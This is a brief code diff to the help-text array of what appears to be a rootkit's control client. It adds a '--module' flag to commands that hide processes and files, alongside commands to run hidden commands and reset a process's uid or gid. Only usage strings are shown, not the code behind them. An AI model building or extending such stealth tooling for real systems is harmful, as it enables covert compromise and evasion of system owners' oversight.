@@ -22,8 +22,8 @@ const char *const help[] = {
 	"disinfect",
 	"exec [--bash] [--hide] [--uid <uid>] [--gid <gid>] <command>",
 	"kill <pid>",
-	"hide [--pid <pid> | --file <path>]",
-	"unhide [--pid <pid> | --file <path>]",
+	"hide [--pid <pid> | --file <path>] | --module",
+	"unhide [--pid <pid> | --file <path>] | --module",
 	"set <pid> [--uid <uid>] [--gid <gid>]",
 	"unset <pid> [--uid] [--gid]",
 	"help <module>"
